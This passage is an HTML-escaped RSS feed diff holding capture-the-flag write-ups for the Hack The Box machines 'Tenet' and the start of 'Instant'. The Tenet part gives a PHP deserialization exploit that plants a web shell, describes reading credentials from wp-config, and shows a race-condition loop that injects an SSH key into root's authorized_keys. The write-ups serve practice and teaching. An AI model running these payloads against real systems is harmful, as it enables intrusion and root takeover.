+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: Apache2 Ubuntu Default Page: It works
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;web-server&#34;&gt;Web Server&lt;/h2&gt;
+&lt;hr&gt;
+&lt;p&gt;Navigating to &lt;code&gt;http://10.10.10.223&lt;/code&gt;, we get the default Apache page&lt;/p&gt;
+
+  &lt;figure class=&#34;center&#34; &gt;
+    &lt;img src=&#34;//localhost:1313/img/htb/tenet/apache_default_page.png&#34;   /&gt;
+    
+      &lt;figcaption class=&#34;center&#34; &gt;Default Apache page&lt;/figcaption&gt;
+    
+  &lt;/figure&gt;
+
+
+&lt;p&gt;Seeing this, we can try to launch a directory fuzzing in order to discover other pages:&lt;/p&gt;
+
+
+
+  &lt;div class=&#34;collapsable-code&#34;&gt;
+    &lt;input id=&#34;581273964&#34; type=&#34;checkbox&#34;  /&gt;
+    &lt;label for=&#34;581273964&#34;&gt;
+      &lt;span class=&#34;collapsable-code__language&#34;&gt;bash&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__title&#34;&gt;Dirfuzzing with ffuf&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;△&#34; data-label-collapse=&#34;▽&#34;&gt;&lt;/span&gt;
+    &lt;/label&gt;
+    &lt;pre class=&#34;language-bash&#34; &gt;&lt;code&gt;
+ffuf -u &amp;#39;http://10.10.10.223/FUZZ&amp;#39; -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -ic
+
+&amp;lt;SNIP...&amp;gt;
+
+wordpress               [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 26ms]
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;/div&gt;
+
+
+&lt;p&gt;Short after, we discover a &lt;code&gt;/wordpress&lt;/code&gt; endpoint. Navigating to &lt;code&gt;http://10.10.10.223/wordpress&lt;/code&gt; we get the following:&lt;/p&gt;
+
+  &lt;figure class=&#34;center&#34; &gt;
+    &lt;img src=&#34;//localhost:1313/img/htb/tenet/wordpress_without_css.png&#34;   /&gt;
+    
+      &lt;figcaption class=&#34;center&#34; &gt;Wordpress page&lt;/figcaption&gt;
+    
+  &lt;/figure&gt;
+
+
+&lt;p&gt;Looks like the css did not load properly. Upon examining the page source, we discover that the css file are fetched under the domain &lt;code&gt;tenet.htb&lt;/code&gt;.&lt;/p&gt;
+
+  &lt;figure class=&#34;center&#34; &gt;
+    &lt;img src=&#34;//localhost:1313/img/htb/tenet/page_source.png&#34;   /&gt;
+    
+      &lt;figcaption class=&#34;center&#34; &gt;Page source&lt;/figcaption&gt;
+    
+  &lt;/figure&gt;
+
+
+&lt;p&gt;After adding it to our hosts file and reloading the page, we are able to access the blog at &lt;code&gt;http://tenet.htb&lt;/code&gt;&lt;/p&gt;
+
+  &lt;figure class=&#34;center&#34; &gt;
+    &lt;img src=&#34;//localhost:1313/img/htb/tenet/tenet_blog.png&#34;   /&gt;
+    
+      &lt;figcaption class=&#34;center&#34; &gt;Wordpress page with css&lt;/figcaption&gt;
+    
+  &lt;/figure&gt;
+
+
+&lt;p&gt;If we navigate at the bottom of the page, we can find something interesting:&lt;/p&gt;
+
+  &lt;figure class=&#34;center&#34; &gt;
+    &lt;img src=&#34;//localhost:1313/img/htb/tenet/comment.png&#34;   /&gt;
+    
+      &lt;figcaption class=&#34;center&#34; &gt;Neil&#39;s comment on Migration post&lt;/figcaption&gt;
+    
+  &lt;/figure&gt;
+
+
+
+  &lt;figure class=&#34;center&#34; &gt;
+    &lt;img src=&#34;//localhost:1313/img/htb/tenet/migration_post.png&#34;   /&gt;
+    
+      &lt;figcaption class=&#34;center&#34; &gt;Migration post&lt;/figcaption&gt;
+    
+  &lt;/figure&gt;
+
+
+&lt;p&gt;In the above comment, neil is mentioning a &lt;code&gt;sator.php&lt;/code&gt; file and a backup. However &lt;code&gt;/sator.php&lt;/code&gt; does not exist on the &lt;code&gt;tenet.htb&lt;/code&gt;, let&amp;rsquo;s try the IP address instead.&lt;/p&gt;
+
+  &lt;figure class=&#34;center&#34; &gt;
+    &lt;img src=&#34;//localhost:1313/img/htb/tenet/sator.php.png&#34;   /&gt;
+    
+      &lt;figcaption class=&#34;center&#34; &gt;/sator.php&lt;/figcaption&gt;
+    
+  &lt;/figure&gt;
+
+
+&lt;p&gt;We see something that looks like the output of a script. Assuming that the previously mentioned backup is of the &lt;code&gt;sator.php&lt;/code&gt; file, we could try to get &lt;code&gt;/sator.php.bak&lt;/code&gt;.&lt;/p&gt;
+&lt;h3 id=&#34;php-code-review&#34;&gt;PHP Code Review&lt;/h3&gt;
+&lt;hr&gt;
+&lt;p&gt;And it indeed works, we downloaded the php file, we can now read its content:&lt;/p&gt;
+
+
+
+  &lt;div class=&#34;collapsable-code&#34;&gt;
+    &lt;input id=&#34;798356241&#34; type=&#34;checkbox&#34;  /&gt;
+    &lt;label for=&#34;798356241&#34;&gt;
+      &lt;span class=&#34;collapsable-code__language&#34;&gt;php&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__title&#34;&gt;sator.php&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;△&#34; data-label-collapse=&#34;▽&#34;&gt;&lt;/span&gt;
+    &lt;/label&gt;
+    &lt;pre class=&#34;language-php&#34; &gt;&lt;code&gt;
+&amp;lt;?php
+
+class DatabaseExport
+{
+        public $user_file = &amp;#39;users.txt&amp;#39;;
+        public $data = &amp;#39;&amp;#39;;
+
+        public function update_db()
+        {
+                echo &amp;#39;[&amp;#43;] Grabbing users from text file &amp;lt;br&amp;gt;&amp;#39;;
+                $this-&amp;gt; data = &amp;#39;Success&amp;#39;;
+        }
+
+
+        public function __destruct()
+        {
+                file_put_contents(__DIR__ . &amp;#39;/&amp;#39; . $this -&amp;gt;user_file, $this-&amp;gt;data);
+                echo &amp;#39;[] Database updated &amp;lt;br&amp;gt;&amp;#39;;
+        //      echo &amp;#39;Gotta get this working properly...&amp;#39;;
+        }
+}
+
+$input = $_GET[&amp;#39;arepo&amp;#39;] ?? &amp;#39;&amp;#39;;
+$databaseupdate = unserialize($input);
+
+$app = new DatabaseExport;
+$app -&amp;gt; update_db();
+
+
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;/div&gt;
+
+
+&lt;p&gt;This script will initialize the &lt;code&gt;$input&lt;/code&gt; variable with the value of the GET parameter &lt;code&gt;arepo&lt;/code&gt; (set to &amp;lsquo;&amp;rsquo;, if not provided). It will then unserialize it and save it in &lt;code&gt;$databaseupdate&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Looking at the &lt;code&gt;DatabaseExport&lt;/code&gt; class, we see that it has two attributes:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;$user_file&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;$data&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;The function &lt;code&gt;update_db()&lt;/code&gt; just outputs some text and update the &lt;code&gt;$data&lt;/code&gt; variable to &amp;lsquo;Success&amp;rsquo;.&lt;/p&gt;
+&lt;p&gt;The &lt;code&gt;__destruct()&lt;/code&gt; function, which is a special function called when an object of type &lt;code&gt;DatabaseExport&lt;/code&gt; is freed from the memory, will write to a file whatever is in the &lt;code&gt;$data&lt;/code&gt; variable.&lt;/p&gt;
+&lt;p&gt;With all this information, we can write a web shell by doing the following:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Create a serialized object of type &lt;code&gt;DatabaseExport&lt;/code&gt; with the &lt;code&gt;$user_file&lt;/code&gt; variable set to the name of our webshell and &lt;code&gt;$data&lt;/code&gt; set to the actual webshell php code.&lt;/li&gt;
+&lt;li&gt;Pass this serialized object to the &lt;code&gt;sator.php&lt;/code&gt; script through the GET parameter &lt;code&gt;arepo&lt;/code&gt;.&lt;/li&gt;
+&lt;li&gt;Then, the script will instanciate a new object with the provided data.&lt;/li&gt;
+&lt;li&gt;Once the execution is done, the &lt;code&gt;__destruct()&lt;/code&gt; method is called, and our webshell will be written.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;deserialization-to-rce&#34;&gt;Deserialization to RCE&lt;/h3&gt;
+&lt;hr&gt;
+&lt;p&gt;We can use the following php script to generate our serialized object:&lt;/p&gt;
+
+
+
+  &lt;div class=&#34;collapsable-code&#34;&gt;
+    &lt;input id=&#34;694812573&#34; type=&#34;checkbox&#34;  /&gt;
+    &lt;label for=&#34;694812573&#34;&gt;
+      &lt;span class=&#34;collapsable-code__language&#34;&gt;php&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__title&#34;&gt;Exploit script&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;△&#34; data-label-collapse=&#34;▽&#34;&gt;&lt;/span&gt;
+    &lt;/label&gt;
+    &lt;pre class=&#34;language-php&#34; &gt;&lt;code&gt;
+&amp;lt;?php
+class DatabaseExport {
+    public $user_file = &amp;#34;shell.php&amp;#34;;
+    public $data = &amp;#39;&amp;lt;?php system($_GET[&amp;#34;cmd&amp;#34;]); ?&amp;gt;&amp;#39;;
+}
+
+$dbe = new DatabaseExport;
+echo &amp;#34;-&amp;gt; &amp;#34; . serialize($dbe) . &amp;#34;\n&amp;#34;;
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;/div&gt;
+
+
+&lt;p&gt;After executing the script, we get the following serialized object:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;O&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;14&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;DatabaseExport&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;9&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;user_file&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;9&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;shell.php&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;data&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;30&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;lt;?php system(&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;$_GET[&amp;#34;cmd&amp;#34;]&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;); ?&amp;gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Now we can send it to the &lt;code&gt;sator.php&lt;/code&gt; script:&lt;/p&gt;
+
+  &lt;figure class=&#34;center&#34; &gt;
+    &lt;img src=&#34;//localhost:1313/img/htb/tenet/sending_payload.png&#34;   /&gt;
+    
+      &lt;figcaption class=&#34;center&#34; &gt;Sending exploit to /sator.php&lt;/figcaption&gt;
+    
+  &lt;/figure&gt;
+
+
+&lt;p&gt;Here we notice that &lt;code&gt;[] Database updated &amp;lt;br&amp;gt;&lt;/code&gt; appears twice, indicating that the &lt;code&gt;__destruct()&lt;/code&gt; method ran twice, which is a good sign.&lt;/p&gt;
+&lt;p&gt;Now let&amp;rsquo;s see if our web shell was successfully created:&lt;/p&gt;
+
+  &lt;figure class=&#34;center&#34; &gt;
+    &lt;img src=&#34;//localhost:1313/img/htb/tenet/webshell.png&#34;   /&gt;
+    
+      &lt;figcaption class=&#34;center&#34; &gt;Web shell as www-data&lt;/figcaption&gt;
+    
+  &lt;/figure&gt;
+
+
+&lt;p&gt;It was, indeed!&lt;/p&gt;
+&lt;p&gt;We can now get a reverse shell:&lt;/p&gt;
+
+  &lt;figure class=&#34;center&#34; &gt;
+    &lt;img src=&#34;//localhost:1313/img/htb/tenet/revshell_payload.png&#34;   /&gt;
+    
+      &lt;figcaption class=&#34;center&#34; &gt;Executing reverse shell&lt;/figcaption&gt;
+    
+  &lt;/figure&gt;
+
+
+
+  &lt;figure class=&#34;center&#34; &gt;
+    &lt;img src=&#34;//localhost:1313/img/htb/tenet/revshell.png&#34;   /&gt;
+    
+      &lt;figcaption class=&#34;center&#34; &gt;Catching reverse shell on netcat listener&lt;/figcaption&gt;
+    
+  &lt;/figure&gt;
+
+
+&lt;h2 id=&#34;privesc&#34;&gt;Privesc&lt;/h2&gt;
+&lt;hr&gt;
+&lt;h3 id=&#34;www-data---neil&#34;&gt;www-data -&amp;gt; neil&lt;/h3&gt;
+&lt;hr&gt;
+&lt;p&gt;Under &lt;code&gt;/var/www/html/wordpress/wp-config.php&lt;/code&gt;, we can find a database password for the user &lt;code&gt;neil&lt;/code&gt;:&lt;/p&gt;
+
+  &lt;figure class=&#34;center&#34; &gt;
+    &lt;img src=&#34;//localhost:1313/img/htb/tenet/wp-config.png&#34;   /&gt;
+    
+      &lt;figcaption class=&#34;center&#34; &gt;Credentials in wp-config.php&lt;/figcaption&gt;
+    
+  &lt;/figure&gt;
+
+
+&lt;p&gt;Using it we can log in as &lt;code&gt;neil&lt;/code&gt; and retrieve the user flag:&lt;/p&gt;
+
+  &lt;figure class=&#34;center&#34; &gt;
+    &lt;img src=&#34;//localhost:1313/img/htb/tenet/user.txt.png&#34;   /&gt;
+    
+      &lt;figcaption class=&#34;center&#34; &gt;User flag obtained!&lt;/figcaption&gt;
+    
+  &lt;/figure&gt;
+
+
+&lt;h3 id=&#34;neil---root&#34;&gt;neil -&amp;gt; root&lt;/h3&gt;
+&lt;hr&gt;
+&lt;p&gt;The user &lt;code&gt;neil&lt;/code&gt; can run the script &lt;code&gt;/usr/local/bin/enableSSH.sh&lt;/code&gt; as root with no password.&lt;/p&gt;
+
+  &lt;figure class=&#34;center&#34; &gt;
+    &lt;img src=&#34;//localhost:1313/img/htb/tenet/neil_sudo_privs.png&#34;   /&gt;
+    
+      &lt;figcaption class=&#34;center&#34; &gt;Neil&#39;s sudo privileges&lt;/figcaption&gt;
+    
+  &lt;/figure&gt;
+
+
+&lt;p&gt;Let&amp;rsquo;s examine the content of that script:&lt;/p&gt;
+
+
+
+  &lt;div class=&#34;collapsable-code&#34;&gt;
+    &lt;input id=&#34;928537614&#34; type=&#34;checkbox&#34;  /&gt;
+    &lt;label for=&#34;928537614&#34;&gt;
+      &lt;span class=&#34;collapsable-code__language&#34;&gt;php&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__title&#34;&gt;enableSSH.sh&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;△&#34; data-label-collapse=&#34;▽&#34;&gt;&lt;/span&gt;
+    &lt;/label&gt;
+    &lt;pre class=&#34;language-php&#34; &gt;&lt;code&gt;
+#!/bin/bash
+
+checkAdded() {
+
+        sshName=$(/bin/echo $key | /usr/bin/cut -d &amp;#34; &amp;#34; -f 3)
+
+        if [[ ! -z $(/bin/grep $sshName /root/.ssh/authorized_keys) ]]; then
+
+                /bin/echo &amp;#34;Successfully added $sshName to authorized_keys file!&amp;#34;
+
+        else
+
+                /bin/echo &amp;#34;Error in adding $sshName to authorized_keys file!&amp;#34;
+
+        fi
+
+}
+
+checkFile() {
+
+        if [[ ! -s $1 ]] || [[ ! -f $1 ]]; then
+
+                /bin/echo &amp;#34;Error in creating key file!&amp;#34;
+
+                if [[ -f $1 ]]; then /bin/rm $1; fi
+
+                exit 1
+
+        fi
+
+}
+
+addKey() {
+
+        tmpName=$(mktemp -u /tmp/ssh-XXXXXXXX)
+
+        (umask 110; touch $tmpName)
+
+        /bin/echo $key &amp;gt;&amp;gt;$tmpName
+
+        checkFile $tmpName
+
+        /bin/cat $tmpName &amp;gt;&amp;gt;/root/.ssh/authorized_keys
+
+        /bin/rm $tmpName
+
+}
+
+key=&amp;#34;ssh-rsa AAAAA3NzaG1yc2GAAAAGAQAAAAAAAQG&amp;#43;AMU8OGdqbaPP/Ls7bXOa9jNlNzNOgXiQh6ih2WOhVgGjqr2449ZtsGvSruYibxN&amp;#43;MQLG59VkuLNU4NNiadGry0wT7zpALGg2Gl3A0bQnN13YkL3AA8TlU/ypAuocPVZWOVmNjGlftZG9AP656hL&amp;#43;c9RfqvNLVcvvQvhNNbAvzaGR2XOVOVfxt&amp;#43;AmVLGTlSqgRXi6/NyqdzG5Nkn9L/GZGa9hcwM8&amp;#43;4nT43N6N31lNhx4NeGabNx33b25lqermjA&amp;#43;RGWMvGN8siaGskvgaSbuzaMGV9N8umLp6lNo5fqSpiGN8MQSNsXa3xXG&amp;#43;kplLn2W&amp;#43;pbzbgwTNN/w0p&amp;#43;Urjbl root@ubuntu&amp;#34;
+addKey
+checkAdded
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;/div&gt;
+
+
+&lt;p&gt;This script will basically create a temporary file with &lt;code&gt;mktemp -u /tmp/ssh-XXXXXXXX&lt;/code&gt;, then check if the file is empty and if it is an actual file. If the check passes, the content of the &lt;code&gt;$key&lt;/code&gt; variable will be appended to it. And finally the temporary will appended to &lt;code&gt;/root/.ssh/authorized_keys&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;The logic of this script opens the door for a potential race condition attack when the script is checking the newly created file (in the &lt;code&gt;checkFile()&lt;/code&gt; function).&lt;/p&gt;
+&lt;p&gt;To exploit it, we can create a script that will constantly update all temporary file by writting into them our ssh public key. We win the race if our update happens after the check, this will add our public key into &lt;code&gt;/root/.ssh/authorized_keys&lt;/code&gt; effectively allowing us to login as root.&lt;/p&gt;
+
+
+
+  &lt;div class=&#34;collapsable-code&#34;&gt;
+    &lt;input id=&#34;387964512&#34; type=&#34;checkbox&#34;  /&gt;
+    &lt;label for=&#34;387964512&#34;&gt;
+      &lt;span class=&#34;collapsable-code__language&#34;&gt;bash&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__title&#34;&gt;Updating script&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;△&#34; data-label-collapse=&#34;▽&#34;&gt;&lt;/span&gt;
+    &lt;/label&gt;
+    &lt;pre class=&#34;language-bash&#34; &gt;&lt;code&gt;
+while true; do
+    for tempfile in $(ls /tmp/ssh-*); do
+        echo &amp;#34;&amp;lt;KEY_HERE&amp;gt;&amp;#34; &amp;gt; $tempfile;
+    done;
+done
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;/div&gt;
+
+
+&lt;p&gt;We will have to run &lt;code&gt;/usr/local/bin/enableSSH.sh&lt;/code&gt; multiple times until we win the race (the updating script should be running in the background):&lt;/p&gt;
+
+  &lt;figure class=&#34;center&#34; &gt;
+    &lt;img src=&#34;//localhost:1313/img/htb/tenet/race_won.png&#34;   /&gt;
+    
+      &lt;figcaption class=&#34;center&#34; &gt;Race Condition won&lt;/figcaption&gt;
+    
+  &lt;/figure&gt;
+
+
+&lt;p&gt;We can now login as root with the corresponding private key and retrieve the root flag:&lt;/p&gt;
+
+  &lt;figure class=&#34;center&#34; &gt;
+    &lt;img src=&#34;//localhost:1313/img/htb/tenet/root.txt.png&#34;   /&gt;
+    
+      &lt;figcaption class=&#34;center&#34; &gt;Root flag obtained !&lt;/figcaption&gt;
+    
+  &lt;/figure&gt;
+
+
+</content>
+    </item>
+    
+    <item>
+      <title>HTB - Instant</title>
+      <link>//localhost:1313/posts/htb-instant/</link>
+      <pubDate>Tue, 18 Mar 2025 21:14:52 +0100</pubDate>
+      
+      <guid>//localhost:1313/posts/htb-instant/</guid>
+      <description>&lt;p&gt;Instant is a medium difficulty machine covering Reverse Engineering of an android apk, API hacking and decryption of encrypted PuTTY session data.&lt;/p&gt;
+&lt;p&gt;It starts off by downloading the apk of a banking/finance app. After some static analysis, we find some endpoints in the source code. One of these endpoints contains the documentation of the API that the app communicates with. Reading that documentation allows us to spot vulnerability in one of the endpoints allowing us to read local files on the server. By leveraging that vulnerability, we are able to read the private key of a user on the box.&lt;/p&gt;</description>
+      <content>&lt;p&gt;Instant is a medium difficulty machine covering Reverse Engineering of an android apk, API hacking and decryption of encrypted PuTTY session data.&lt;/p&gt;
+&lt;p&gt;It starts off by downloading the apk of a banking/finance app. After some static analysis, we find some endpoints in the source code. One of these endpoints contains the documentation of the API that the app communicates with. Reading that documentation allows us to spot vulnerability in one of the endpoints allowing us to read local files on the server. By leveraging that vulnerability, we are able to read the private key of a user on the box.&lt;/p&gt;
+&lt;p&gt;After login in as that user, we find a certain file containing encrypted data of a PuTTY session which we are able to decrypt using a python script allowing us to get a root shell.&lt;/p&gt;
+&lt;h3 id=&#34;nmap-results&#34;&gt;Nmap Results&lt;/h3&gt;
+&lt;hr&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;PORT   STATE SERVICE REASON  VERSION
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;22/tcp open  ssh     syn-ack OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ssh-hostkey:
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; 31:83:eb:9f:15:f8:40:a5:04:9c:cb:3f:f6:ec:49:76 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ECDSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMM6fK04LJ4jNNL950Ft7YHPO9NKONYVCbau/+tQKoy3u7J9d8xw2sJaajQGLqTvyWMolbN3fKzp7t/s/ZMiZNo&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; 6f:66:03:47:0e:8a:e0:03:97:67:5b:41:cf:e2:c7:c7 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ED25519&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIL+zjgyGvnf4lMAlvdgVHlwHd+/U4NcThn1bx5/4DZYY
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;80/tcp open  http    syn-ack Apache httpd 2.4.58
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: Did not follow redirect to http://instant.htb/
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; http-methods:
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  Supported Methods: GET HEAD POST OPTIONS
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-server-header: Apache/2.4.58 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Service Info: Host: instant.htb&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; OS: Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;From the scan results, we see that we have 2 ports open:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;22 running ssh&lt;/li&gt;
+&lt;li&gt;80 running an Apache server redirecting to &lt;code&gt;http://instant.htb&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Let&amp;rsquo;s add it to our host file&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; -e &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;lt;IP&amp;gt;\tinstant.htb&amp;#34;&lt;/span&gt; &amp;gt;&amp;gt; /etc/hosts
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;website&#34;&gt;Website&lt;/h3&gt;
+&lt;hr&gt;
+&lt;p&gt;Now let&amp;rsquo;s navigate to &lt;code&gt;http://instant.htb&lt;/code&gt;&lt;/p&gt;
+
+  &lt;figure class=&#34;center&#34; &gt;
+    &lt;img src=&#34;//localhost:1313/img/htb/instant/website.png&#34;   /&gt;
+    
+      &lt;figcaption class=&#34;center&#34; &gt;Home Page&lt;/figcaption&gt;
+    
+  &lt;/figure&gt;
+
+
+&lt;p&gt;This seems to be a website for a mobile application. Clicking on &amp;lsquo;Download Now&amp;rsquo;, we can download the apk.&lt;/p&gt;
+
+  &lt;figure class=&#34;center&#34; &gt;
+    &lt;img src=&#34;//localhost:1313/img/htb/instant/download_apk.png&#34;   /&gt;
+    
+      &lt;figcaption class=&#34;center&#34; &gt;Downloading apk file&lt;/figcaption&gt;
+    
+  &lt;/figure&gt;
+
+
+&lt;h3 id=&#34;apk-reversing&#34;&gt;APK Reversing&lt;/h3&gt;
+&lt;hr&gt;
+&lt;p&gt;We can use &lt;a href=&#34;https://github.com/skylot/jadx&#34;&gt;jadx&lt;/a&gt; to decompile the apk and get access to the source code.&lt;/p&gt;
+&lt;p&gt;After opening the apk in jadx, we can use the search feature to look for endpoints that the application communicates with. We can try to search for &lt;code&gt;.instant.htb&lt;/code&gt; for example:&lt;/p&gt;
+
+  &lt;figure class=&#34;center&#34; &gt;
+    &lt;img src=&#34;//localhost:1313/img/htb/instant/api_endpoints.png&#34;   /&gt;
+    
+      &lt;figcaption class=&#34;center&#34; &gt;Searching for API endpoints&lt;/figcaption&gt;
+    
+  &lt;/figure&gt;
+
+
